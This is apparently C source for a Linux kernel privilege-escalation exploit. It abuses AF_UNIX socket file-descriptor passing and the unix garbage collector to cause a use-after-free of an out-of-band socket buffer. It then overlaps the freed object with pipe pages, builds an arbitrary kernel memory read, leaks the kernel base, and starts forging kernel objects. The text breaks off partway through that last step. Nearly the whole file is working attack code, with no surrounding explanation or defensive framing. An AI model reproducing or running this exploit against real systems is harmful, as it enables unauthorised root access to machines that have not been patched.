#include "exploit.hpp"

u64 user_cs, user_ss, user_rsp, user_rflags;

void unix_error(const char *msg)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
	exit(EXIT_FAILURE);
}

void Pthread_error(const char *msg, int error_code)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(error_code));
	exit(EXIT_FAILURE);
}

int Socket(int domain, int type, int protocol)
{
	int fd = socket(domain, type, protocol);
	if (fd < 0)
		unix_error("socket");

	return fd;
}

void Socketpair(int domain, int type, int protocol, int socket_vector[2])
{
	if (socketpair(domain, type, protocol, socket_vector) < 0)
		unix_error("socketpair");
}

void Setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen)
{
	if (setsockopt(sockfd, level, optname, optval, optlen) < 0)
		unix_error("setsockopt");
}

void Connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	if (connect(sockfd, addr, addrlen) < 0)
		unix_error("connect");
}

void Bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	if (bind(sockfd, addr, addrlen) < 0)
		unix_error("bind");
}

void Getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	if (getsockname(sockfd, addr, addrlen) < 0)
		unix_error("getsockname");
}

void Listen(int sockfd, int backlog)
{
	if (listen(sockfd, backlog) < 0)
		unix_error("listen");
}

int Accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	int new_sockfd = accept(sockfd, addr, addrlen);
	if (new_sockfd < 0)
		unix_error("accept");
	
	return new_sockfd;
}

ssize_t Sendmsg(int socket, const struct msghdr *message, int flags)
{
	ssize_t ret = sendmsg(socket, message, flags);
	if (ret < 0)
		unix_error("sendmsg");
	
	return ret;
}

ssize_t Recvmsg(int socket, struct msghdr *message, int flags)
{
	ssize_t ret = recvmsg(socket, message, flags);
	if (ret < 0)
		unix_error("recvmsg");

	return ret;
}

ssize_t Send(int sockfd, const void *buf, size_t size, int flags)
{
	ssize_t ret = send(sockfd, buf, size, flags);
	if (ret < 0)
		unix_error("send");

	return ret;
}

ssize_t Sendto(int sockfd, const void *msg, size_t length, int flags, const struct sockaddr *dst_addr, socklen_t dst_len)
{
	ssize_t ret = sendto(sockfd, msg, length, flags, dst_addr, dst_len);
	if (ret < 0)
		unix_error("sendto");
	
	return ret;
}

ssize_t Recv(int sockfd, void *buf, size_t size, int flags)
{
	ssize_t ret = recv(sockfd, buf, size, flags);
	if (ret < 0)
		unix_error("recv");
	
	return ret;
}

void *Calloc(size_t nelem, size_t elsize)
{
	void *p = calloc(nelem, elsize);
	if (p == NULL)
		unix_error("calloc");

	return p;
}

void Close(int fd)
{
	if (close(fd) < 0)
		unix_error("close");
}

void Pipe(int pipefd[2])
{
	if (pipe(pipefd) < 0)
		unix_error("pipe");
}

int Fcntl(int fd, int op, unsigned long arg)
{
	int ret = fcntl(fd, op, arg);
	if (ret < 0)
		unix_error("fcntl");

	return ret;
}

ssize_t Write(int fd, const void *buf, size_t count)
{
	ssize_t ret = write(fd, buf, count);
	if (ret < 0)
		unix_error("write");

	return ret;
}

ssize_t Read(int fd, void *buf, size_t count)
{
	ssize_t ret = read(fd, buf, count);
	if (ret < 0)
		unix_error("read");

	return ret;
}

void Ioctl(int fd, unsigned long op, unsigned long arg)
{
	if (ioctl(fd, op, arg) < 0)
		unix_error("ioctl");
}

void Unshare(int flags)
{
	if (unshare(flags) < 0)
		unix_error("unshare");
}

void Getrlimit(int resource, struct rlimit *rlim)
{
	if (getrlimit(resource, rlim) < 0)
		unix_error("getrlimit");
}

void Setrlimit(int resource, const struct rlimit *rlim)
{
	if (setrlimit(resource, rlim) < 0)
		unix_error("setrlimit");
}

int Msgget(key_t key, int msgflg)
{
	int qid = msgget(key, msgflg);
	if (qid < 0)
		unix_error("msgget");

	return qid;
}

void Msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg)
{
	if (msgsnd(msqid, msgp, msgsz, msgflg) < 0)
		unix_error("msgsnd");
}

void Msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
	if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
		unix_error("msgrcv");
}

int Msgctl(int msqid, int op, struct msqid_ds *buf)
{
	int ret = msgctl(msqid, op, buf);
	if (ret < 0)
		unix_error("msgctl");
	
	return ret;
}

void Sched_setaffinity(pid_t pid, size_t cpusetsize, const cpu_set_t *cpuset)
{
	if (sched_setaffinity(pid, cpusetsize, cpuset) < 0)
		unix_error("sched_setaffinity");
}

void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)
{
	int ret = pthread_create(newthread, attr, start_routine, arg);
	if (ret != 0)
		Pthread_error("pthread_create", ret);
}

void Pthread_join(pthread_t thread, void **retval)
{
	int ret = pthread_join(thread, retval);
	if (ret != 0)
		Pthread_error("pthread_join", ret);
}

void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset)
{
	int ret = pthread_setaffinity_np(thread, cpusetsize, cpuset);
	if (ret != 0)
		Pthread_error("pthread_setaffinity_np", ret);
}

void pin_thread_on_cpu(int cpu)
{
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	pthread_t current_thread = pthread_self();
	Pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void sendfds(
        int unix_sockfd,
        void *data,
        size_t data_len,
        int *fds,
        int fds_len,
        struct sockaddr_un addr,
        socklen_t addrlen
)
{
	assert(fds_len <= SCM_MAX_FD);
	union {
		char buf[CMSG_SPACE(sizeof(int) * SCM_MAX_FD)];
		struct cmsghdr align;
	} control_msg;

	struct msghdr msgh = {};
	struct iovec iov = {};

	iov.iov_base = data;
	iov.iov_len = data_len;
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;

	msgh.msg_control = control_msg.buf;
	msgh.msg_controllen = CMSG_SPACE(sizeof(int) * fds_len);

	struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
	cmsgp->cmsg_level = SOL_SOCKET;
	cmsgp->cmsg_type = SCM_RIGHTS;
	cmsgp->cmsg_len = CMSG_LEN(sizeof(int) * fds_len);
	memcpy(CMSG_DATA(cmsgp), fds, sizeof(int) * fds_len);

	if (addrlen) {
		msgh.msg_name = &addr;
		msgh.msg_namelen = addrlen;
	}

	Sendmsg(unix_sockfd, &msgh, 0);
}

void recvfds(int unix_sockfd, void *data, size_t data_len, int *fds, int fds_len, int msg_peek)
{
	struct msghdr msgh = {};
	struct iovec iov = {};
	size_t msg_controllen = CMSG_SPACE(fds_len * sizeof(int));
	void *msg_control = Calloc(1, msg_controllen);

	iov.iov_base = data;
	iov.iov_len = data_len;
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;
	msgh.msg_control = msg_control;
	msgh.msg_controllen = msg_controllen;
	Recvmsg(unix_sockfd, &msgh, msg_peek);

	struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
	if (cmsgp == NULL ||
		cmsgp->cmsg_len != CMSG_LEN(fds_len * sizeof(int)) ||
		cmsgp->cmsg_type != SCM_RIGHTS)
			exit(EXIT_FAILURE);

	memcpy(fds, CMSG_DATA(cmsgp), fds_len * sizeof(int));
	free(msg_control);
}

void *unix_gc_thread_fn(void *arg)
{
	pin_thread_on_cpu(1);
	struct unix_gc_thread *t = (struct unix_gc_thread *)arg;

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->trigger_gc)
			pthread_cond_wait(&t->cond, &t->mutex);

		t->trigger_gc = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);

		if (quit)
			break;

		union {
			char buf[CMSG_SPACE(sizeof(int))];
			struct cmsghdr align;
		} control_msg;

		int dummy_data = 0;
		struct iovec iov = { .iov_base = &dummy_data, .iov_len = sizeof(int) };

		struct msghdr msgh = {
			.msg_iov = &iov,
			.msg_iovlen = 1,
			.msg_control = control_msg.buf,
			.msg_controllen = CMSG_SPACE(sizeof(int)),
			//.msg_flags = MSG_OOB
		};

		struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
		cmsgp->cmsg_level = SOL_SOCKET;
		cmsgp->cmsg_type = SCM_RIGHTS;
		cmsgp->cmsg_len = CMSG_LEN(sizeof(int));
		memcpy(CMSG_DATA(cmsgp), &t->wait_for_gc_fd, sizeof(int));

		Close(t->trigger_gc_fd);
		int ret = sendmsg(t->wait_for_gc_fd, &msgh, MSG_OOB);
		if (!(ret == -1 && errno == EOPNOTSUPP)) {
			fprintf(stderr, "Kernel function unix_dgram_sendmsg() implementation changed\n");
			exit(EXIT_FAILURE);
		}

		t->trigger_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);

		pthread_mutex_lock(&t->mutex);
		t->gc_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	return NULL;
}

void unix_gc_trigger(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->trigger_gc = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_wait(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->gc_complete)
		pthread_cond_wait(&t->cond, &t->mutex);

	t->gc_complete = false;
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_thread_quit(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_thread_init(struct unix_gc_thread *t)
{
	t->trigger_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	t->wait_for_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	Pthread_create(&t->handle, NULL, unix_gc_thread_fn, t);
}

void unix_gc_thread_cleanup(struct unix_gc_thread *t)
{
	unix_gc_thread_quit(t);
	pthread_cond_destroy(&t->cond);
	pthread_mutex_destroy(&t->mutex);	
}

void exploit_kernel_unix_graph_prepare(struct exploit_kernel_unix_graph *p)
{
	p->stream_unix_socket_A_fd = Socket(AF_UNIX, SOCK_STREAM, 0);
	p->stream_unix_socket_B_fd = Socket(AF_UNIX, SOCK_STREAM, 0);
	p->stream_unix_socket_C_fd = -1;
	p->dgram_unix_socket_D_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);

	struct sockaddr_un auto_bind_addr = { .sun_family = AF_UNIX };
	Bind(
		p->stream_unix_socket_A_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);

	Bind(
		p->stream_unix_socket_B_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);

	Bind(
		p->dgram_unix_socket_D_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);

	Listen(p->stream_unix_socket_A_fd, 1);

	struct sockaddr_un socket_A_addr = {};
	socklen_t socket_A_addrlen = sizeof(socket_A_addr);
	Getsockname(p->stream_unix_socket_A_fd, (struct sockaddr *)&socket_A_addr, &socket_A_addrlen);
	Connect(p->stream_unix_socket_B_fd, (const struct sockaddr *)&socket_A_addr, socket_A_addrlen);
}

void exploit_kernel_unix_graph_build_stage_1(struct exploit_kernel_unix_graph *p)
{
	u8 dummy = 0;
	sendfds(
		p->stream_unix_socket_B_fd,
		&dummy,
		sizeof(dummy),
		(int *)&p->stream_unix_socket_B_fd,
		1,
		(struct sockaddr_un){},
		0
	);
}

void exploit_kernel_unix_graph_build_stage_2(struct exploit_kernel_unix_graph *p)
{
	p->stream_unix_socket_C_fd = Accept(p->stream_unix_socket_A_fd, NULL, NULL);
	u8 dummy = 0;

	struct sockaddr_un dst_addr = {};
	socklen_t dst_len = sizeof(dst_addr);
	Getsockname(p->dgram_unix_socket_D_fd, (struct sockaddr *)&dst_addr, &dst_len);

	sendfds(
		p->dgram_unix_socket_D_fd,
		&dummy,
		sizeof(dummy),
		(int *)&p->stream_unix_socket_C_fd,
		1,
		dst_addr,
		dst_len
	);
}

void exploit_kernel_unix_graph_cleanup(struct exploit_kernel_unix_graph *p)
{
	if (p->stream_unix_socket_A_fd != -1) {
		Close(p->stream_unix_socket_A_fd);
		p->stream_unix_socket_A_fd = -1;
	}

	if (p->stream_unix_socket_B_fd != -1) {
		Close(p->stream_unix_socket_B_fd);
		p->stream_unix_socket_B_fd = -1;
	}

	if (p->stream_unix_socket_C_fd != -1) {
		Close(p->stream_unix_socket_C_fd);
		p->stream_unix_socket_C_fd = -1;
	}

	if (p->dgram_unix_socket_D_fd != -1) {
		Close(p->dgram_unix_socket_D_fd);
		p->dgram_unix_socket_D_fd = -1;
	}
}

void cyclic_kernel_unix_graph_prepare(struct cyclic_kernel_unix_graph *p)
{
	p->dgram_unix_socket_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	struct sockaddr_un addr = { .sun_family = AF_UNIX };
	Bind(p->dgram_unix_socket_fd, (const struct sockaddr *)&addr, offsetof(struct sockaddr_un, sun_path));
}

void cyclic_kernel_unix_graph_build(struct cyclic_kernel_unix_graph *p)
{
	u8 dummy = 0;

	struct sockaddr_un dst_addr = {};
	socklen_t dst_len = sizeof(dst_addr);
	Getsockname(p->dgram_unix_socket_fd, (struct sockaddr *)&dst_addr, &dst_len);

	sendfds(
		p->dgram_unix_socket_fd,
		&dummy,
		sizeof(dummy),
		&p->dgram_unix_socket_fd,
		1,
		dst_addr,
		dst_len
	);
}

void cyclic_kernel_unix_graph_cleanup(struct cyclic_kernel_unix_graph *p)
{
	if (p->dgram_unix_socket_fd != -1) {
		Close(p->dgram_unix_socket_fd);
		p->dgram_unix_socket_fd = -1;
	}
}

void kernel_unix_vertex_spray_prepare(struct kernel_unix_vertex_spray *p, int spray_count)
{
	p->dgram_unix_socket_fds = (int *)Calloc(spray_count, sizeof(*p->dgram_unix_socket_fds));
	for (int i = 0; i < spray_count; i++) {
		p->dgram_unix_socket_fds[i] = Socket(AF_UNIX, SOCK_DGRAM, 0);
		struct sockaddr_un addr = {. sun_family = AF_UNIX };
		Bind(p->dgram_unix_socket_fds[i], (const struct sockaddr *)&addr, offsetof(struct sockaddr_un, sun_path));
	}

	p->vertex_count = spray_count;
}

void kernel_unix_vertex_spray_trigger_alloc(struct kernel_unix_vertex_spray *p)
{
	u8 dummy = 0;
	for (int i = 0; i < p->vertex_count; i++) {
		if (i != p->vertex_count - 1) {
			struct sockaddr_un dst_addr = {};
			socklen_t dst_len = sizeof(dst_addr);
			Getsockname(p->dgram_unix_socket_fds[i + 1], (struct sockaddr *)&dst_addr, &dst_len);
			
			sendfds(
				p->dgram_unix_socket_fds[i],
				&dummy,
				sizeof(dummy),
				(int *)&p->dgram_unix_socket_fds[i],
				1,
				dst_addr,
				dst_len
			);
		} else {
			struct sockaddr_un dst_addr = {};
			socklen_t dst_len = sizeof(dst_addr);
			Getsockname(p->dgram_unix_socket_fds[0], (struct sockaddr *)&dst_addr, &dst_len);

			sendfds(
				p->dgram_unix_socket_fds[i],
				&dummy,
				sizeof(dummy),
				(int *)&p->dgram_unix_socket_fds[i],
				1,
				dst_addr,
				dst_len
			);
		}
	}
}

void kernel_unix_vertex_spray_trigger_free(struct kernel_unix_vertex_spray *p)
{
	u8 dummy = 0;
	int tmp_fd = -1;

	for (int i = 0; i < p->vertex_count; i++) {
		recvfds(
			p->dgram_unix_socket_fds[i],
			&dummy,
			sizeof(dummy),
			&tmp_fd,
			1,
			0
		);

		Close(tmp_fd);
	}
}

void kernel_unix_vertex_spray_cleanup(struct kernel_unix_vertex_spray *p)
{
	for (int i = 0; i < p->vertex_count; i++) {
		if (p->dgram_unix_socket_fds[i] != -1) {
			Close(p->dgram_unix_socket_fds[i]);
			p->dgram_unix_socket_fds[i] = -1;
		}
	}

	free(p->dgram_unix_socket_fds);
}

void prepare_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct cyclic_kernel_unix_graph *cyclic_kernel_unix_graph,
	struct kernel_unix_vertex_spray *kernel_unix_vertex_spray,
	struct unix_gc_thread *unix_gc_thread
)
{
	kernel_unix_vertex_spray_trigger_alloc(kernel_unix_vertex_spray);
	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);
	kernel_unix_vertex_spray_trigger_free(kernel_unix_vertex_spray);

	exploit_kernel_unix_graph_build_stage_1(exploit_kernel_unix_graph);
	cyclic_kernel_unix_graph_build(cyclic_kernel_unix_graph);
	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);

	exploit_kernel_unix_graph_build_stage_2(exploit_kernel_unix_graph);
	
	u8 detect_byte = UAF_OOB_SKB_BYTE_DATA;
	Send(
		exploit_kernel_unix_graph->stream_unix_socket_C_fd,
		&detect_byte,
		sizeof(detect_byte),
		MSG_OOB
	);
}

bool trigger_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct unix_gc_thread *unix_gc_thread
)
{
	Close(exploit_kernel_unix_graph->stream_unix_socket_B_fd);
	exploit_kernel_unix_graph->stream_unix_socket_B_fd = -1;

	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);

	u8 dummy = 0;
	int stream_unix_socket_B_newfd = -1;
	recvfds(
		exploit_kernel_unix_graph->stream_unix_socket_C_fd,
		&dummy,
		sizeof(dummy),
		(int *)&stream_unix_socket_B_newfd,
		1,
		0
	);

	exploit_kernel_unix_graph->stream_unix_socket_B_fd = stream_unix_socket_B_newfd;
	return uaf_success(stream_unix_socket_B_newfd);
}

bool uaf_success(int victim_socket_fd)
{
	int inq_len = 0;
	Ioctl(victim_socket_fd, SIOCINQ, (unsigned long)&inq_len);

	u8 dummy = 0;
	int ret = recv(victim_socket_fd, &dummy, 1, MSG_OOB | MSG_PEEK);

	return (ret == 1 && inq_len == 0) || (ret == -1 && errno == EFAULT);
}

void setup_nofile_rlimit(void)
{
	struct rlimit nofile_rlimit = {};
	Getrlimit(RLIMIT_NOFILE, &nofile_rlimit);
	nofile_rlimit.rlim_cur = nofile_rlimit.rlim_max;
	Setrlimit(RLIMIT_NOFILE, &nofile_rlimit);
}

void overlap_oob_skb_with_pipe_page(
        int *out_victim_fd,
        int out_overlap_pipe[2],
        int *out_page_nth,
        int *out_page_offset
)
{
#define TOTAL_SOCKETPAIR 	512
#define TOTAL_PIPE		64
#define SKB_PER_SOCKET		256

	struct unix_gc_thread unix_gc_thread = {};
	unix_gc_thread_init(&unix_gc_thread);

	int dgram_unix_socketpairs[TOTAL_SOCKETPAIR][2] = {};
	for (int i = 0; i < TOTAL_SOCKETPAIR; i++)
		Socketpair(AF_UNIX, SOCK_DGRAM, 0, dgram_unix_socketpairs[i]);

	int pipe_fds[TOTAL_PIPE][2] = {};
	for (int i = 0; i < TOTAL_PIPE; i++) {
		Pipe(pipe_fds[i]);
		Fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * PAGE_PER_PIPE);
	}

	u8 skb_data_buffer[TOTAL_PIPE][PAGE_PER_PIPE][SKBUFF_HEAD_CACHE_OBJS_PER_SLAB] = {};
	for (int i = 0; i < TOTAL_PIPE; i++) {
		for (int j = 0; j < PAGE_PER_PIPE; j++) {
			for (int k = 0; k < SKBUFF_HEAD_CACHE_OBJS_PER_SLAB; k++) {
				skb_data_buffer[i][j][k] = RECLAIM_UAF_OOB_SKB_DATA;
			}
		}
	}

	u8 page_buffer[PAGE_SIZE] = {};
	u8 victim_oob_skb_data = 0;
	u8 dummy = 0;
	int victim_fd = -1;
	ssize_t recv_ret = -1;
	bool cross_cache_success = false;

	while (!cross_cache_success) {
		for (int i = 0; i < TOTAL_SOCKETPAIR; i++) {
			for (int j = 0; j < SKB_PER_SOCKET; j++) {
				Send(dgram_unix_socketpairs[i][0], &dummy, 1, MSG_DONTWAIT);
			}
		}

		bool uaf_success = false;
		while (!uaf_success) {
			struct cyclic_kernel_unix_graph cyclic_kernel_unix_graph = {};
			struct exploit_kernel_unix_graph exploit_kernel_unix_graph = {};
			struct kernel_unix_vertex_spray kernel_unix_vertex_spray = {};
			
			cyclic_kernel_unix_graph_prepare(&cyclic_kernel_unix_graph);
			exploit_kernel_unix_graph_prepare(&exploit_kernel_unix_graph);
			kernel_unix_vertex_spray_prepare(&kernel_unix_vertex_spray, 25);
			
			prepare_uaf(
				&exploit_kernel_unix_graph,
				&cyclic_kernel_unix_graph,
				&kernel_unix_vertex_spray,
				&unix_gc_thread
			);

			uaf_success = trigger_uaf(&exploit_kernel_unix_graph, &unix_gc_thread);
			if (uaf_success) {
				victim_fd = exploit_kernel_unix_graph.stream_unix_socket_B_fd;
				exploit_kernel_unix_graph.stream_unix_socket_B_fd = -1;
			}

			cyclic_kernel_unix_graph_cleanup(&cyclic_kernel_unix_graph);
			exploit_kernel_unix_graph_cleanup(&exploit_kernel_unix_graph);
			kernel_unix_vertex_spray_cleanup(&kernel_unix_vertex_spray);
		}

		for (int i = 0; i < TOTAL_SOCKETPAIR; i++) {
			for (int total_packets = 0; total_packets < SKB_PER_SOCKET; total_packets++) {
				Send(dgram_unix_socketpairs[i][1], &dummy, 1, MSG_DONTWAIT);
			}
		}

		for (int i = 0; i < TOTAL_SOCKETPAIR; i++) {
			for (int j = 0; j < SKB_PER_SOCKET; j++) {
				Recv(dgram_unix_socketpairs[i][1], &dummy, 1, 0);
			}
		}

		for (int i = 0; i < TOTAL_SOCKETPAIR; i++) {
			for (int j = 0; j < SKB_PER_SOCKET; j++) {
				Recv(dgram_unix_socketpairs[i][0], &dummy, 1, 0);
			}
		}

		memset(page_buffer, 0, sizeof(page_buffer));
		for (int i = 0; i < SKBUFF_HEAD_CACHE_OBJS_PER_SLAB; i++) {
			*(u32 *)(page_buffer + i * SKBUFF_HEAD_CACHE_OBJ_SIZE + STRUCT_SK_BUFF_MEMBER_LEN_OFFSET) = 1;
			*(u32 *)(page_buffer + i * SKBUFF_HEAD_CACHE_OBJ_SIZE + STRUCT_SK_BUFF_MEMBER_DATA_LEN_OFFSET) = 0;
		}

		for (int i = 0; i < TOTAL_PIPE; i++) {
			for (int j = 0; j < PAGE_PER_PIPE; j++) {
				for (int k = 0; k < SKBUFF_HEAD_CACHE_OBJS_PER_SLAB; k++) {
					*(u64 *)(page_buffer + k * SKBUFF_HEAD_CACHE_OBJ_SIZE + STRUCT_SK_BUFF_MEMBER_DATA_OFFSET) = (u64)(&skb_data_buffer[i][j][k]);
				}
				
				Write(pipe_fds[i][1], page_buffer, PAGE_SIZE);
			}
		}

		recv_ret = recv(victim_fd, &victim_oob_skb_data, 1, MSG_OOB | MSG_PEEK);
		if (recv_ret == 1 && victim_oob_skb_data == RECLAIM_UAF_OOB_SKB_DATA) {
			cross_cache_success = true;
		} else {
			for (int i = 0; i < TOTAL_PIPE; i++) {
				for (int j = 0; j < PAGE_PER_PIPE; j++) {
					Read(pipe_fds[i][0], page_buffer, PAGE_SIZE);
				}
			}
		}
	}

	printf("[+] cross cache success\n");

	bool found_overlap_pipe = false;
	for (int i = 0; i < TOTAL_PIPE && !found_overlap_pipe; i++) {
		for (int j = 0; j < PAGE_PER_PIPE && !found_overlap_pipe; j++) {
			for (int k = 0; k < SKBUFF_HEAD_CACHE_OBJS_PER_SLAB && !found_overlap_pipe; k++) {
				skb_data_buffer[i][j][k] = DETECT_OVERLAP_PIPE_OOB_SKB_DATA;
				recv_ret = recv(victim_fd, &victim_oob_skb_data, 1, MSG_OOB | MSG_PEEK);
				if (recv_ret == 1 && victim_oob_skb_data == DETECT_OVERLAP_PIPE_OOB_SKB_DATA) {
					*out_victim_fd = victim_fd;
					out_overlap_pipe[0] = pipe_fds[i][0];
					pipe_fds[i][0] = -1;
					out_overlap_pipe[1] = pipe_fds[i][1];
					pipe_fds[i][1] = -1;
					*out_page_nth = j;
					*out_page_offset = k * SKBUFF_HEAD_CACHE_OBJ_SIZE;
					found_overlap_pipe = true;
				}
			}
		}
	}

	if (!found_overlap_pipe) {
		fprintf(stderr, "unexpected condition\n");
		exit(EXIT_FAILURE);
	}

	for (int i = 0; i < TOTAL_SOCKETPAIR; i++) {
		Close(dgram_unix_socketpairs[i][0]);
		Close(dgram_unix_socketpairs[i][1]);
	}

	for (int i = 0; i < TOTAL_PIPE; i++) {
		if (pipe_fds[i][0] != -1) {
			Close(pipe_fds[i][0]);
		}

		if (pipe_fds[i][1] != -1) {
			Close(pipe_fds[i][1]);
		}
	}

	unix_gc_thread_cleanup(&unix_gc_thread);
	
#undef SKB_PER_SOCKET
#undef TOTAL_PIPE
#undef TOTAL_SOCKETPAIR
}

void uaf_oob_skb_overwrite_prepare_page_buffer(void *page_buffer, int member_offset, void *value, size_t value_size)
{	
	memcpy(page_buffer + g_overlap_page_offset + member_offset, value, value_size);
}

void uaf_oob_skb_overwrite_trigger(void *page_buffer)
{
	if (g_victim_sockfd == -1 || g_overlap_pipe_fd[0] == -1 || g_overlap_pipe_fd[1] == -1) {
		fprintf(stderr, "forget to call abr_read_prepare()\n");
		exit(EXIT_FAILURE);
	}

	u8 tmp_page[PAGE_SIZE] = {};

	for (int i = 0; i < PAGE_PER_PIPE; i++) {
		Read(g_overlap_pipe_fd[0], tmp_page, PAGE_SIZE);
		Write(g_overlap_pipe_fd[1], page_buffer, PAGE_SIZE);
	}
}

void abr_read(u64 kernel_address, void *bytes, size_t total_bytes)
{
	if (g_victim_sockfd == -1 || g_overlap_pipe_fd[0] == -1 || g_overlap_pipe_fd[1] == -1) {
		fprintf(stderr, "forget to call abr_read_prepare()\n");
		exit(EXIT_FAILURE);
	}

	u8 page_buffer[PAGE_SIZE] = {};

	u32 skb_len = 1;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_LEN_OFFSET,
		&skb_len,
		sizeof(skb_len)
	);

	u32 skb_data_len = 0;
	uaf_oob_skb_overwrite_prepare_page_buffer(
		page_buffer,
		STRUCT_SK_BUFF_MEMBER_DATA_LEN_OFFSET,
		&skb_data_len,
		sizeof(skb_data_len)
	);

	for (size_t i = 0; i < total_bytes; i++) {
		u64 skb_data = kernel_address + i;
		uaf_oob_skb_overwrite_prepare_page_buffer(
			page_buffer,
			STRUCT_SK_BUFF_MEMBER_DATA_OFFSET,
			&skb_data,
			sizeof(skb_data)
		);

		uaf_oob_skb_overwrite_trigger(page_buffer);

		u8 byte = 0;
		ssize_t recv_ret = recv(g_victim_sockfd, &byte, 1, MSG_OOB | MSG_PEEK);
		if (recv_ret < 0) {
			fprintf(stderr, "unexpected condition in abr_read()\n");
			exit(EXIT_FAILURE);
		}

		*(u8 *)((uintptr_t)bytes + i) = byte;
	}
}

u64 find_kernel_base(void)
{
	struct gate_struct idt_entry = {};
	abr_read(0xfffffe0000000000UL, &idt_entry, sizeof(idt_entry));

	unsigned long asm_exc_divide_error_addr =
      		(((u64)idt_entry.offset_high  ) << 32) |
      		(((u64)idt_entry.offset_middle) << 16) |
      		(((u64)idt_entry.offset_low   ) << 0);

	fprintf(stderr, "[+] asm_exc_divide_error: 0x%016lx\n", asm_exc_divide_error_addr);
	return asm_exc_divide_error_addr - asm_exc_divide_error_offset_from_kernel_base;
}

bool setup_fake_skb_with_msg_msgseg(int victim_fd, int *out_qid, u64 *out_msg_msgseg_addr)
{
	int qid = Msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	u8 msg_buffer[MSG_BUFFER_SIZE_MAX] = {};
	struct msgbuf *msg = (struct msgbuf *)msg_buffer;
	msg->mtype = 1;
	uintptr_t fake_skb = (uintptr_t)(msg->mtext + DATALEN_MSG);

	u64 kmalloc_cg_2k_addr = 0;
	bool found_kmalloc_cg_2k_address = false;

	int dgram_unix_socketpair[2] = {};
	Socketpair(AF_UNIX, SOCK_DGRAM, 0, dgram_unix_socketpair);

	while (!found_kmalloc_cg_2k_address) {
		struct list_head unix_unvisited_vertices = {};
		abr_read(unix_unvisited_vertices_symbol, &unix_unvisited_vertices, sizeof(unix_unvisited_vertices));

		printf("unix_unvisited_vertices.next: 0x%016lx\n", (u64)(unix_unvisited_vertices.next));
		printf("unix_unvisited_vertices.prev: 0x%016lx\n", (u64)(unix_unvisited_vertices.prev));

		struct list_head last_unix_unvisited_vertices = unix_unvisited_vertices;

		int fds[KMALLOC_CG_2K_SIZE / STRUCT_unix_edge_SIZE] = {};

		for (size_t i = 0; i < sizeof(fds) / sizeof(fds[0]); i++) {
			fds[i] = dgram_unix_socketpair[0];
		}

		sendfds(
			dgram_unix_socketpair[0],
			NULL,
			0,
			fds,
			KMALLOC_CG_2K_SIZE / STRUCT_unix_edge_SIZE,
			(struct sockaddr_un){},
			0
		);

		abr_read(unix_unvisited_vertices_symbol, &unix_unvisited_vertices, sizeof(unix_unvisited_vertices));

		if (unix_unvisited_vertices.prev != last_unix_unvisited_vertices.prev) {
			u64 vertex_addr = (u64)unix_unvisited_vertices.prev - STRUCT_unix_vertex_MEMBER_entry_OFFSET;
			printf("[+] vertex addr: 0x%016lx\n", vertex_addr);

			u64 out_degree = 0;
			abr_read(
				vertex_addr + STRUCT_unix_vertex_MEMBER_out_degree_OFFSET,
				&out_degree,
				sizeof(out_degree)
			);

			printf("[+] out_degree: %lu\n", out_degree);

			if (out_degree == KMALLOC_CG_2K_SIZE / STRUCT_unix_edge_SIZE) {
				struct list_head edges = {};
				abr_read(
					vertex_addr + STRUCT_unix_vertex_MEMBER_edges_OFFSET,
					&edges,
					sizeof(edges)
				);

				printf("[+] edges.next = 0x%016lx\n", (u64)(edges.next));
				printf("[+] edges.prev = 0x%016lx\n", (u64)(edges.prev));

